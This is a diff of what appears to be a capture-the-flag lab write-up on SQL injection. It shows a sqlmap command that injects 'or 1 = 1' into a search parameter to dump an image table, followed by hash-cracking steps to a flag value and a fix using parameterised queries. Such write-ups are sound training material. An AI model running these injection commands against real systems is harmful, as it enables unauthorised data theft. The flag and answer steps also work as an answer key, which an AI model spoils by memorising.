@@ -18,10 +18,8 @@ EXPLOIT_?
         sqlmap -u "http://192.168.8.6/?page=searchimg&id=1+or+1+%3D+1&Submit=Submit#" --dump -T list_images
 
         ^ should retune the table:
-        Database: Member_images
-
-Table: list_images
-[6 entries]
+        
+        
 +----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
 | id | url                              | title     | comment                                                                                                               |
 +----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
@@ -37,12 +35,12 @@ Table: list_images
     a decoded string i.e "albatroz", then then type "abatroz" in "https://passwordsgenerator.net/sha256-hash-generator/"
     to get the Flag "5F894D1824AFA90D623FA370A9DA97603427A2902F97C280D93D6561F7FB373B"
 
-    thus => 1928e8083cf461a51303633093573c46 => albaroz => 5F894D1824AFA90D623FA370A9DA97603427A2902F97C280D93D6561F7FB373B
+ 1928e8083cf461a51303633093573c46 => albaroz => 5F894D1824AFA90D623FA370A9DA97603427A2902F97C280D93D6561F7FB373B
 
-SOLUTION__
+SOLUTION:
 
-    => Use SQL Parameters (parametized Queries)
-     for Protection e.g txtNam = getRequestString("CustomerName");
+    Use SQL Parameters (parametized Queries)
+    for Protection e.g txtNam = getRequestString("CustomerName");
                         txtAdd = getRequestString("Address");
                         txtCit = getRequestString("City");
                         txtSQL = "INSERT INTO Customers (CustomerName,Address,City) Values(@0,@1,@2)";
